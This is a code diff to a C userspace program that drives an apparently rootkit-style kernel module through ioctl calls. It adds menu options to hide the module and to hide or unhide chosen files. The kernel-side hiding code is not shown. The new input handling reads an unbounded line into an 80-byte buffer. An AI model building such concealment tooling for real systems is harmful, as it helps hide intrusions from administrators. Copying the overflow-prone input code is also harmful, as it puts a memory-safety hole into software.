@@ -68,13 +68,25 @@ ioctl_get_nth_byte(int file_desc)
   putchar('\n');
 }
 ioctl_toggle_hide_module(int file_desc){
-  int ret_val;
-  //char[100] message;
-  ret_val = ioctl(file_desc, IOCTL_TOGGLE_HIDE_MODULE, 0);
+  return  ioctl(file_desc, IOCTL_TOGGLE_HIDE_MODULE, 0);
 }
+ioctl_hide_file(int file_desc, char *path_name){
+  return ioctl(file_desc, IOCTL_HIDE_FILE, path_name);
+}
+ioctl_unhide_file(int file_desc, char *path_name){
+  return ioctl(file_desc, IOCTL_UNHIDE_FILE, path_name);
+}
+
+
+
 /* 
  * Main - Call the ioctl functions 
  */
+void
+clear (void)
+{    
+  while ( getchar() != '\n' );
+}
 main()
 {
   int file_desc, ret_val;
@@ -91,21 +103,39 @@ main()
   // ioctl_get_msg(file_desc);
   //ioctl_set_msg(file_desc, msg);
   int input ;
+  char file_path[80];
   while (1){
     printf("1. hide module\n");
-
+    printf("2. hide file\n");
+    printf("3. unhide file\n");
     printf("input:");
     scanf("%d", &input);
     switch(input){
     case 1:
       ioctl_toggle_hide_module(file_desc);
       return 0;
-      //break;
-      
+      break;
+    case 2:
+      clear();
+      printf("enter file to hide:");
+      scanf("%[^\n]%*c", file_path);
+      printf("file path: %s\n", file_path);
+      ioctl_hide_file(file_desc, file_path);
+      return 0;
+      break;
+    case 3:
+      clear();
+      printf("enter file to unhide:");
+      scanf("%[^\n]%*c", file_path);
+      printf("file path: %s\n", file_path);
+      ioctl_unhide_file(file_desc, file_path);
+      return 0;
+      break;
     default:
       break;
     }
     
   }
   close(file_desc);
+  return 0;
 }
